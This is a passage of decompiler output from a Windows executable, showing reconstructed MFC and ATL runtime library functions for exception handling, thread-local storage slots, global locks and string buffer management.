  iVar1 = AfxLoadString(*(uint *)(this + 0x114),(wchar_t *)(this + 0x14),0x80);
  *(uint *)(this + 0x10) = (uint)(iVar1 != 0);
  return;
}



void FUN_0040a59b(void)

{
  code *pcVar1;
  undefined **local_8;
  
  local_8 = &PTR_vftable_00432198;
  __CxxThrowException_8(&local_8,&DAT_0042f560);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  void __stdcall AfxThrowNotSupportedException(void)
// 
// Library: Visual Studio 2008 Release

void AfxThrowNotSupportedException(void)

{
  code *pcVar1;
  undefined **local_8;
  
  local_8 = &PTR_vftable_004322b0;
  __CxxThrowException_8(&local_8,&DAT_0042f614);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  void __stdcall AfxThrowNotSupportedException(void)
// 
// Library: Visual Studio 2008 Release

void AfxThrowNotSupportedException(void)

{
  code *pcVar1;
  undefined **local_8;
  
  local_8 = &PTR_vftable_004323c8;
  __CxxThrowException_8(&local_8,&DAT_0042f658);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  int __cdecl AfxCrtErrorCheck(int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release,
// Visual Studio 2015 Release

int __cdecl AfxCrtErrorCheck(int param_1)

{
  int iVar1;
  
  if (param_1 != 0) {
    if (param_1 == 0xc) {
      iVar1 = FUN_0040a59b();
      return iVar1;
    }
    if (((param_1 == 0x16) || (param_1 == 0x22)) || (param_1 != 0x50)) {
      AfxThrowNotSupportedException();
      return param_1;
    }
  }
  return param_1;
}



// Library Function - Single Match
//  int __cdecl ATL::Checked::tcsncpy_s(wchar_t *,unsigned int,wchar_t const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl ATL::Checked::tcsncpy_s(wchar_t *param_1,uint param_2,wchar_t *param_3,uint param_4)

{
  errno_t eVar1;
  int iVar2;
  
  eVar1 = _wcsncpy_s(param_1,param_2,param_3,param_4);
  iVar2 = AfxCrtErrorCheck(eVar1);
  return iVar2;
}



void __fastcall FUN_0040a66b(int param_1)

{
  *(undefined4 *)(param_1 + 4) = 1;
  return;
}



void __thiscall FUN_0040a675(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 4) = param_1;
  return;
}



// Library Function - Single Match
//  public: virtual int __thiscall CSimpleException::GetErrorMessage(wchar_t *,unsigned int,unsigned
// int *)const 
// 
// Library: Visual Studio 2008 Release

int __thiscall
CSimpleException::GetErrorMessage
          (CSimpleException *this,wchar_t *param_1,uint param_2,uint *param_3)

{
  int iVar1;
  
  if ((param_1 == (wchar_t *)0x0) || (param_2 == 0)) {
    iVar1 = 0;
  }
  else {
    if (param_3 != (uint *)0x0) {
      *param_3 = 0;
    }
    if (*(int *)(this + 0xc) == 0) {
      InitString(this);
    }
    if (*(int *)(this + 0x10) == 0) {
      *param_1 = L'\0';
    }
    else {
      ATL::Checked::tcsncpy_s(param_1,param_2,(wchar_t *)(this + 0x14),0xffffffff);
    }
    iVar1 = *(int *)(this + 0x10);
  }
  return iVar1;
}



void FUN_0040a6dd(void *param_1)

{
  FUN_0040a3fc(param_1);
  return;
}



undefined4 * __thiscall FUN_0040a6ef(void *this,byte param_1)

{
  *(undefined ***)this = CSimpleException::vftable;
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: static void * __stdcall CNoTrackObject::operator new(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * CNoTrackObject::operator_new(uint param_1)

{
  void *pvVar1;
  
  pvVar1 = LocalAlloc(0x40,param_1);
  if (pvVar1 == (HLOCAL)0x0) {
    pvVar1 = (void *)FUN_0040a59b();
  }
  return pvVar1;
}



// Library Function - Single Match
//  public: static void __stdcall CNoTrackObject::operator delete(void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void CNoTrackObject::operator_delete(void *param_1)

{
  if (param_1 != (void *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040a73a. Too many branches
                    // WARNING: Treating indirect jump as call
    LocalFree(param_1);
    return;
  }
  return;
}



void FUN_0040a744(void)

{
  return;
}



// Library Function - Single Match
//  public: void * __thiscall CThreadSlotData::GetThreadValue(int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __thiscall CThreadSlotData::GetThreadValue(CThreadSlotData *this,int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  void *pvVar1;
  LPVOID pvVar2;
  
  lpCriticalSection = (LPCRITICAL_SECTION)(this + 0x1c);
  EnterCriticalSection(lpCriticalSection);
  if ((((0 < param_1) && (param_1 < *(int *)(this + 0xc))) &&
      (pvVar2 = TlsGetValue(*(DWORD *)this), pvVar2 != (LPVOID)0x0)) &&
     (param_1 < *(int *)((int)pvVar2 + 8))) {
    pvVar1 = *(void **)(*(int *)((int)pvVar2 + 0xc) + param_1 * 4);
    LeaveCriticalSection(lpCriticalSection);
    return pvVar1;
  }
  LeaveCriticalSection(lpCriticalSection);
  return (void *)0x0;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: class CNoTrackObject * __thiscall CProcessLocalObject::GetData(class CNoTrackObject *
// (__stdcall*)(void))
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CNoTrackObject * __thiscall
CProcessLocalObject::GetData(CProcessLocalObject *this,_func_CNoTrackObject_ptr *param_1)

{
  CNoTrackObject *pCVar1;
  
  if (*(int *)this == 0) {
    AfxLockGlobals(0x10);
    if (*(int *)this == 0) {
      pCVar1 = (*param_1)();
      *(CNoTrackObject **)this = pCVar1;
    }
    AfxUnlockGlobals(0x10);
  }
  return *(CNoTrackObject **)this;
}



void Catch_0040a7d6(void)

{
  code *pcVar1;
  
  AfxUnlockGlobals(0x10);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  public: __thiscall CProcessLocalObject::~CProcessLocalObject(void)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CProcessLocalObject::~CProcessLocalObject(CProcessLocalObject *this)

{
  if (*(int *)this != 0) {
    if (*(undefined4 **)this != (undefined4 *)0x0) {
      (**(code **)**(undefined4 **)this)(1);
    }
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  long __cdecl ATL::AtlMultiply<unsigned int>(unsigned int *,unsigned int,unsigned int)
//  long __cdecl ATL::AtlMultiply<unsigned long>(unsigned long *,unsigned long,unsigned long)
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl AtlMultiply<>(undefined4 *param_1,uint param_2,uint param_3)

{
  if ((int)((ulonglong)param_2 * (ulonglong)param_3 >> 0x20) != 0) {
    return 0x80070057;
  }
  *param_1 = (int)((ulonglong)param_2 * (ulonglong)param_3);
  return 0;
}



void FUN_0040a834(int param_1)

{
  code *pcVar1;
  
  if (param_1 == -0x7ff8fff2) {
    FUN_0040a59b();
  }
  AfxThrowOleException(param_1);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  public: void * * __thiscall CSimpleList::GetNextPtr(void *)const 
// 
// Library: Visual Studio 2008 Release

void ** __thiscall CSimpleList::GetNextPtr(CSimpleList *this,void *param_1)

{
  CSimpleList *extraout_ECX;
  
  if (param_1 == (void *)0x0) {
    AfxThrowNotSupportedException();
    this = extraout_ECX;
  }
  return (void **)(*(int *)(this + 4) + (int)param_1);
}



// Library Function - Single Match
//  unsigned int __cdecl ATL::AtlMultiplyThrow<unsigned int>(unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

uint __cdecl ATL::AtlMultiplyThrow<unsigned_int>(uint param_1,uint param_2)

{
  int iVar1;
  uint local_8;
  
  iVar1 = AtlMultiply<>(&local_8,param_1,param_2);
  if (iVar1 < 0) {
    FUN_0040a834(iVar1);
  }
  return local_8;
}



// Library Function - Single Match
//  public: void __thiscall CSimpleList::AddHead(void *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CSimpleList::AddHead(CSimpleList *this,void *param_1)

{
  void **ppvVar1;
  
  ppvVar1 = GetNextPtr(this,param_1);
  *ppvVar1 = *(void **)this;
  *(void **)this = param_1;
  return;
}



// Library Function - Single Match
//  public: int __thiscall CThreadSlotData::AllocSlot(void)
// 
// Library: Visual Studio 2008 Release

int __thiscall CThreadSlotData::AllocSlot(CThreadSlotData *this)

{
  LPCRITICAL_SECTION lpCriticalSection;
  uint *puVar1;
  int iVar2;
  byte *pbVar3;
  uint uVar4;
  HGLOBAL pvVar5;
  LPVOID pvVar6;
  uint uVar7;
  int iVar8;
  UINT uFlags;
  
  lpCriticalSection = (LPCRITICAL_SECTION)(this + 0x1c);
  EnterCriticalSection(lpCriticalSection);
  iVar2 = *(int *)(this + 4);
  iVar8 = *(int *)(this + 8);
  if ((iVar2 <= iVar8) || ((*(byte *)(*(int *)(this + 0x10) + iVar8 * 8) & 1) != 0)) {
    iVar8 = 1;
    if (1 < iVar2) {
      pbVar3 = *(byte **)(this + 0x10);
      do {
        pbVar3 = pbVar3 + 8;
        if ((*pbVar3 & 1) == 0) break;
        iVar8 = iVar8 + 1;
      } while (iVar8 < iVar2);
      if (iVar8 < iVar2) goto LAB_0040a99d;
    }
    uVar7 = iVar2 + 0x20;
    if (*(LPCVOID *)(this + 0x10) == (LPCVOID)0x0) {
      uVar4 = ATL::AtlMultiplyThrow<unsigned_int>(uVar7,8);
      pvVar5 = GlobalAlloc(2,uVar4);
    }
    else {
      pvVar5 = GlobalHandle(*(LPCVOID *)(this + 0x10));
      GlobalUnlock(pvVar5);
      uFlags = 0x2002;
      uVar4 = ATL::AtlMultiplyThrow<unsigned_int>(uVar7,8);
      pvVar5 = GlobalReAlloc(pvVar5,uVar4,uFlags);
    }
    if (pvVar5 == (HGLOBAL)0x0) {
      this = *(CThreadSlotData **)(this + 0x10);
      if (this != (CThreadSlotData *)0x0) {
        pvVar5 = GlobalHandle(this);
        GlobalLock(pvVar5);
      }
      LeaveCriticalSection(lpCriticalSection);
      pvVar5 = (HGLOBAL)FUN_0040a59b();
    }
    pvVar6 = GlobalLock(pvVar5);
    _memset((void *)((int)pvVar6 + *(int *)(this + 4) * 8),0,(uVar7 - *(int *)(this + 4)) * 8);
    *(uint *)(this + 4) = uVar7;
    *(LPVOID *)(this + 0x10) = pvVar6;
  }
LAB_0040a99d:
  if (*(int *)(this + 0xc) <= iVar8) {
    *(int *)(this + 0xc) = iVar8 + 1;
  }
  puVar1 = (uint *)(*(int *)(this + 0x10) + iVar8 * 8);
  *puVar1 = *puVar1 | 1;
  *(int *)(this + 8) = iVar8 + 1;
  LeaveCriticalSection(lpCriticalSection);
  return iVar8;
}



// Library Function - Single Match
//  public: __thiscall CThreadSlotData::CThreadSlotData(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CThreadSlotData * __thiscall CThreadSlotData::CThreadSlotData(CThreadSlotData *this)

{
  DWORD DVar1;
  
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 0x18) = 4;
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 8) = 1;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  DVar1 = TlsAlloc();
  *(DWORD *)this = DVar1;
  if (DVar1 == 0xffffffff) {
    FUN_0040a59b();
  }
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 0x1c));
  return this;
}



// Library Function - Single Match
//  public: void __thiscall CThreadSlotData::FreeSlot(int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CThreadSlotData::FreeSlot(CThreadSlotData *this,int param_1)

{
  uint *puVar1;
  undefined4 *puVar2;
  int iVar3;
  
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 0x1c));
  if ((0 < param_1) && (param_1 < *(int *)(this + 0xc))) {
    for (iVar3 = *(int *)(this + 0x14); iVar3 != 0; iVar3 = *(int *)(iVar3 + 4)) {
      if (param_1 < *(int *)(iVar3 + 8)) {
        puVar2 = *(undefined4 **)(*(int *)(iVar3 + 0xc) + param_1 * 4);
        if (puVar2 != (undefined4 *)0x0) {
          (**(code **)*puVar2)(1);
        }
        *(undefined4 *)(*(int *)(iVar3 + 0xc) + param_1 * 4) = 0;
      }
    }
    puVar1 = (uint *)(*(int *)(this + 0x10) + param_1 * 8);
    *puVar1 = *puVar1 & 0xfffffffe;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(this + 0x1c));
  return;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

void __thiscall FUN_0040aa6e(void *this,int param_1,int param_2)

{
  LPCRITICAL_SECTION lpCriticalSection;
  undefined4 *lpTlsValue;
  uint uVar1;
  HLOCAL pvVar2;
  UINT uFlags;
  
  lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x1c);
  EnterCriticalSection(lpCriticalSection);
  if ((param_1 < 1) || (*(int *)((int)this + 0xc) <= param_1)) goto LAB_0040ab95;
                    // WARNING: Load size is inaccurate
  lpTlsValue = (undefined4 *)TlsGetValue(*this);
  if (lpTlsValue == (undefined4 *)0x0) {
    lpTlsValue = (undefined4 *)CNoTrackObject::operator_new(0x10);
    if (lpTlsValue == (undefined4 *)0x0) {
      lpTlsValue = (undefined4 *)0x0;
    }
    else {
      *lpTlsValue = CThreadData::vftable;
    }
    lpTlsValue[2] = 0;
    lpTlsValue[3] = 0;
    CSimpleList::AddHead((CSimpleList *)((int)this + 0x14),lpTlsValue);
LAB_0040aac5:
    if (lpTlsValue[3] == 0) {
      uVar1 = ATL::AtlMultiplyThrow<unsigned_int>(*(uint *)((int)this + 0xc),4);
      pvVar2 = LocalAlloc(0,uVar1);
    }
    else {
      uFlags = 2;
      uVar1 = ATL::AtlMultiplyThrow<unsigned_int>(*(uint *)((int)this + 0xc),4);
      pvVar2 = LocalReAlloc((HLOCAL)lpTlsValue[3],uVar1,uFlags);
    }
    if (pvVar2 == (HLOCAL)0x0) {
      LeaveCriticalSection(lpCriticalSection);
      pvVar2 = (HLOCAL)FUN_0040a59b();
    }
    lpTlsValue[3] = pvVar2;
    _memset((void *)((int)pvVar2 + lpTlsValue[2] * 4),0,
            (*(int *)((int)this + 0xc) - lpTlsValue[2]) * 4);
    lpTlsValue[2] = *(undefined4 *)((int)this + 0xc);
                    // WARNING: Load size is inaccurate
    TlsSetValue(*this,lpTlsValue);
  }
  else if (((int)lpTlsValue[2] <= param_1) && (param_2 != 0)) goto LAB_0040aac5;
  if ((lpTlsValue[3] != 0) && (param_1 < (int)lpTlsValue[2])) {
    *(int *)(lpTlsValue[3] + param_1 * 4) = param_2;
  }
LAB_0040ab95:
  LeaveCriticalSection(lpCriticalSection);
  return;
}



// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

void Catch_0040ab0f(void)

{
  uint uBytes;
  HLOCAL pvVar1;
  int unaff_EBP;
  LPVOID unaff_ESI;
  DWORD *unaff_EDI;
  UINT uFlags;
  
  LeaveCriticalSection((LPCRITICAL_SECTION)(*(int *)(unaff_EBP + -0x18) + 0x1c));
  __CxxThrowException_8(0,(byte *)0x0);
  uFlags = 2;
  uBytes = ATL::AtlMultiplyThrow<unsigned_int>(unaff_EDI[3],4);
  pvVar1 = LocalReAlloc(*(HLOCAL *)((int)unaff_ESI + 0xc),uBytes,uFlags);
  if (pvVar1 == (HLOCAL)0x0) {
    LeaveCriticalSection(*(LPCRITICAL_SECTION *)(unaff_EBP + -0x14));
    pvVar1 = (HLOCAL)FUN_0040a59b();
  }
  *(HLOCAL *)((int)unaff_ESI + 0xc) = pvVar1;
  _memset((void *)((int)pvVar1 + *(int *)((int)unaff_ESI + 8) * 4),0,
          (unaff_EDI[3] - *(int *)((int)unaff_ESI + 8)) * 4);
  *(DWORD *)((int)unaff_ESI + 8) = unaff_EDI[3];
  TlsSetValue(*unaff_EDI,unaff_ESI);
  if ((*(int *)((int)unaff_ESI + 0xc) != 0) &&
     (*(int *)(unaff_EBP + 8) < *(int *)((int)unaff_ESI + 8))) {
    *(undefined4 *)(*(int *)((int)unaff_ESI + 0xc) + *(int *)(unaff_EBP + 8) * 4) =
         *(undefined4 *)(unaff_EBP + 0xc);
  }
  LeaveCriticalSection(*(LPCRITICAL_SECTION *)(unaff_EBP + -0x14));
  return;
}



void * __thiscall FUN_0040aba3(void *this,byte param_1)

{
  if ((param_1 & 1) != 0) {
    CNoTrackObject::operator_delete(this);
  }
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: class CNoTrackObject * __thiscall CThreadLocalObject::GetData(class CNoTrackObject *
// (__stdcall*)(void))
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CNoTrackObject * __thiscall
CThreadLocalObject::GetData(CThreadLocalObject *this,_func_CNoTrackObject_ptr *param_1)

{
  int iVar1;
  CNoTrackObject *pCVar2;
  
  if (param_1 != (_func_CNoTrackObject_ptr *)0x0) goto LAB_0040abdd;
LAB_0040abd8:
  do {
    AfxThrowNotSupportedException();
LAB_0040abdd:
    if (*(int *)this != 0) goto LAB_0040ac18;
    if (DAT_004340a8 == (CThreadSlotData *)0x0) {
      DAT_004340a8 = (CThreadSlotData *)
                     CThreadSlotData::CThreadSlotData((CThreadSlotData *)&DAT_004340ac);
      if (DAT_004340a8 == (CThreadSlotData *)0x0) goto LAB_0040abd8;
    }
    iVar1 = CThreadSlotData::AllocSlot(DAT_004340a8);
    *(int *)this = iVar1;
    if (iVar1 != 0) {
LAB_0040ac18:
      pCVar2 = (CNoTrackObject *)CThreadSlotData::GetThreadValue(DAT_004340a8,*(int *)this);
      if (pCVar2 == (CNoTrackObject *)0x0) {
        pCVar2 = (*param_1)();
        FUN_0040aa6e(DAT_004340a8,*(int *)this,(int)pCVar2);
      }
      return pCVar2;
    }
  } while( true );
}



// Library Function - Single Match
//  public: __thiscall CThreadLocalObject::~CThreadLocalObject(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CThreadLocalObject::~CThreadLocalObject(CThreadLocalObject *this)

{
  if ((*(int *)this != 0) && (DAT_004340a8 != (CThreadSlotData *)0x0)) {
    CThreadSlotData::FreeSlot(DAT_004340a8,*(int *)this);
  }
  *(undefined4 *)this = 0;
  return;
}



// Library Function - Single Match
//  int __stdcall AfxCriticalInit(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int AfxCriticalInit(void)

{
  if (DAT_004340e0 == 0) {
    DAT_004340e0 = 1;
    InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_00434280);
  }
  return DAT_004340e0;
}



// Library Function - Single Match
//  void __stdcall AfxLockGlobals(int)
// 
// Library: Visual Studio 2008 Release

void AfxLockGlobals(int param_1)

{
  int *piVar1;
  
  if (0x10 < (uint)param_1) {
    AfxThrowNotSupportedException();
  }
  if (DAT_004340e0 == 0) {
    AfxCriticalInit();
  }
  piVar1 = (int *)(&DAT_00434298 + param_1 * 4);
  if (*piVar1 == 0) {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00434280);
    if (*piVar1 == 0) {
      InitializeCriticalSection((LPCRITICAL_SECTION)(&DAT_004340e8 + param_1 * 0x18));
      *piVar1 = *piVar1 + 1;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00434280);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_004340e8 + param_1 * 0x18));
  return;
}



// Library Function - Single Match
//  void __stdcall AfxUnlockGlobals(int)
// 
// Library: Visual Studio 2008 Release

void AfxUnlockGlobals(int param_1)

{
  if (0x10 < (uint)param_1) {
    AfxThrowNotSupportedException();
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_004340e8 + param_1 * 0x18));
  return;
}



void __fastcall FUN_0040ad23(int *param_1)

{
  if ((*param_1 != 0) && (DAT_004340a8 != (CThreadSlotData *)0x0)) {
    CThreadSlotData::FreeSlot(DAT_004340a8,*param_1);
  }
  *param_1 = 0;
  return;
}



// Library Function - Single Match
//  void __stdcall AfxReleaseActCtx(void *)
// 
// Library: Visual Studio 2008 Release

void AfxReleaseActCtx(void *param_1)

{
  if (DAT_004342e0 != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040ad37. Too many branches
                    // WARNING: Treating indirect jump as call
    (*DAT_004342e0)();
    return;
  }
  return;
}



// Library Function - Single Match
//  int __stdcall AfxActivateActCtx(void *,unsigned long *)
// 
// Library: Visual Studio 2008 Release

int AfxActivateActCtx(void *param_1,ulong *param_2)

{
  int iVar1;
  
  if (DAT_004342e4 != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040ad4c. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = (*DAT_004342e4)();
    return iVar1;
  }
  return 0;
}



undefined4 FUN_0040ad54(void)

{
  undefined4 uVar1;
  
  if (DAT_004342e8 != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040ad63. Too many branches
                    // WARNING: Treating indirect jump as call
    uVar1 = (*DAT_004342e8)();
    return uVar1;
  }
  return 0;
}



// Library Function - Single Match
//  enum eActCtxResult __stdcall AfxActivateActCtxWrapper(void *,unsigned long *)
// 
// Library: Visual Studio 2008 Release

eActCtxResult AfxActivateActCtxWrapper(void *param_1,ulong *param_2)

{
  int iVar1;
  eActCtxResult eVar2;
  
  if (param_2 == (ulong *)0x0) {
    AfxThrowNotSupportedException();
  }
  if (DAT_004342e4 == 0) {
    eVar2 = 2;
  }
  else {
    iVar1 = AfxActivateActCtx(param_1,param_2);
    eVar2 = (eActCtxResult)(iVar1 != 0);
  }
  return eVar2;
}



// Library Function - Single Match
//  public: static void __cdecl ATL::CSimpleStringT<wchar_t,0>::CopyCharsOverlapped(wchar_t
// *,unsigned int,wchar_t const *,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl
ATL::CSimpleStringT<wchar_t,0>::CopyCharsOverlapped
          (wchar_t *param_1,uint param_2,wchar_t *param_3,int param_4)

{
  _memcpy_s(param_1,param_2 * 2,param_3,param_4 * 2);
  return;
}



// Library Function - Single Match
//  void __cdecl ATL::Checked::wmemcpy_s(wchar_t *,unsigned int,wchar_t const *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ATL::Checked::wmemcpy_s(wchar_t *param_1,uint param_2,wchar_t *param_3,uint param_4)

{
  int in_EAX;
  
  CSimpleStringT<wchar_t,0>::CopyCharsOverlapped(param_1,param_2,param_3,param_4);
  AfxCrtErrorCheck(in_EAX);
  return;
}



// Library Function - Single Match
//  struct ATL::ATLSTRINGRESOURCEIMAGE const * __cdecl ATL::_AtlGetStringResourceImage(struct
// HINSTANCE__ *,struct HRSRC__ *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

ATLSTRINGRESOURCEIMAGE * __cdecl
ATL::_AtlGetStringResourceImage(HINSTANCE__ *param_1,HRSRC__ *param_2,uint param_3)

{
  HGLOBAL hResData;
  ushort *puVar1;
  DWORD DVar2;
  ushort *puVar3;
  uint uVar4;
  
  hResData = LoadResource(param_1,param_2);
  if (hResData == (HGLOBAL)0x0) {
    return (ATLSTRINGRESOURCEIMAGE *)0x0;
  }
  puVar1 = (ushort *)LockResource(hResData);
  if (puVar1 != (ushort *)0x0) {
    DVar2 = SizeofResource(param_1,param_2);
    puVar3 = (ushort *)(DVar2 + (int)puVar1);
    for (uVar4 = param_3 & 0xf; uVar4 != 0; uVar4 = uVar4 - 1) {
      if (puVar3 <= puVar1) {
        return (ATLSTRINGRESOURCEIMAGE *)0x0;
      }
      puVar1 = puVar1 + *puVar1 + 1;
    }
    if (puVar1 < puVar3) {
      return (ATLSTRINGRESOURCEIMAGE *)(-(uint)(*puVar1 != 0) & (uint)puVar1);
    }
  }
  return (ATLSTRINGRESOURCEIMAGE *)0x0;
}



// Library Function - Single Match
//  struct ATL::ATLSTRINGRESOURCEIMAGE const * __cdecl ATL::AtlGetStringResourceImage(struct
// HINSTANCE__ *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

ATLSTRINGRESOURCEIMAGE * __cdecl ATL::AtlGetStringResourceImage(HINSTANCE__ *param_1,uint param_2)

{
  HRSRC pHVar1;
  ATLSTRINGRESOURCEIMAGE *pAVar2;
  
  pHVar1 = FindResourceW(param_1,(LPCWSTR)((param_2 >> 4) + 1 & 0xffff),(LPCWSTR)0x6);
  if (pHVar1 == (HRSRC)0x0) {
    return (ATLSTRINGRESOURCEIMAGE *)0x0;
  }
  pAVar2 = _AtlGetStringResourceImage(param_1,pHVar1,param_2);
  return pAVar2;
}



void __fastcall FUN_0040ae6f(int **param_1)

{
  int **ppiVar1;
  int *piVar2;
  
  ppiVar1 = param_1 + 3;
  LOCK();
  piVar2 = *ppiVar1;
  *ppiVar1 = (int *)((int)*ppiVar1 + -1);
  UNLOCK();
  if (piVar2 == (int *)0x1 || (int)piVar2 + -1 < 0) {
    (**(code **)(**param_1 + 4))(param_1);
  }
  return;
}



// Library Function - Single Match
//  public: static void __cdecl ATL::ChTraitsCRT<wchar_t>::ConvertToBaseType(wchar_t *,int,wchar_t
// const *,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl
ATL::ChTraitsCRT<wchar_t>::ConvertToBaseType
          (wchar_t *param_1,int param_2,wchar_t *param_3,int param_4)

{
  int iVar1;
  
  if (param_4 == -1) {
    iVar1 = FUN_00416c8a(param_3);
    param_4 = iVar1 + 1;
  }
  Checked::wmemcpy_s(param_1,param_2,param_3,param_4);
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<wchar_t,0>::SetLength(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::SetLength(CSimpleStringT<wchar_t,0> *this,int param_1)

{
  code *pcVar1;
  
  if ((-1 < param_1) && (param_1 <= *(int *)(*(int *)this + -8))) {
    *(int *)(*(int *)this + -0xc) = param_1;
    *(undefined2 *)(*(int *)this + param_1 * 2) = 0;
    return;
  }
  FUN_0040a834(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_0040aee1(void)

{
  code *pcVar1;
  
  FUN_0040a834(-0x7ff8fff2);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  private: static struct ATL::CStringData * __cdecl
// ATL::CSimpleStringT<wchar_t,0>::CloneData(struct ATL::CStringData *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CStringData * __cdecl ATL::CSimpleStringT<wchar_t,0>::CloneData(CStringData *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  CStringData *pCVar3;
  
  puVar2 = (undefined4 *)(**(code **)(**(int **)param_1 + 0x10))();
  piVar1 = (int *)(param_1 + 0xc);
  if ((*piVar1 < 0) || (puVar2 != *(undefined4 **)param_1)) {
    pCVar3 = (CStringData *)(**(code **)*puVar2)(*(undefined4 *)(param_1 + 4),2);
    if (pCVar3 == (CStringData *)0x0) {
      FUN_0040aee1();
    }
    *(undefined4 *)(pCVar3 + 4) = *(undefined4 *)(param_1 + 4);
    CopyCharsOverlapped((wchar_t *)(pCVar3 + 0x10),*(int *)(param_1 + 4) + 1U,
                        (wchar_t *)(param_1 + 0x10),*(int *)(param_1 + 4) + 1U);
  }
  else {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
    pCVar3 = param_1;
  }
  return pCVar3;
}



// Library Function - Single Match
//  public: static void __cdecl ATL::CSimpleStringT<wchar_t,0>::CopyCharsOverlapped(wchar_t
// *,unsigned int,wchar_t const *,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl
ATL::CSimpleStringT<wchar_t,0>::CopyCharsOverlapped
          (wchar_t *param_1,uint param_2,wchar_t *param_3,int param_4)

{
  _memmove_s(param_1,param_2 * 2,param_3,param_4 * 2);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: static int __cdecl ATL::CSimpleStringT<char,0>::StringLength(char const *)
//  public: static int __cdecl ATL::CSimpleStringT<wchar_t,0>::StringLength(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

int __cdecl StringLength(short *param_1)

{
  int iVar1;
  
  if (param_1 == (short *)0x0) {
    return 0;
  }
  iVar1 = FUN_00416c8a(param_1);
  return iVar1;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::Fork(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall ATL::CSimpleStringT<char,0>::Fork(CSimpleStringT<char,0> *this,int param_1)

{
  wchar_t *pwVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  
  pwVar1 = *(wchar_t **)this;
  iVar2 = *(int *)(pwVar1 + -6);
  puVar3 = (undefined4 *)(**(code **)(**(int **)(pwVar1 + -8) + 0x10))();
  iVar4 = (**(code **)*puVar3)(param_1,2);
  if (iVar4 == 0) {
    FUN_0040aee1();
  }
  if (iVar2 < param_1) {
    param_1 = iVar2;
  }
  CSimpleStringT<wchar_t,0>::CopyCharsOverlapped
            ((wchar_t *)(iVar4 + 0x10),param_1 + 1U,pwVar1,param_1 + 1U);
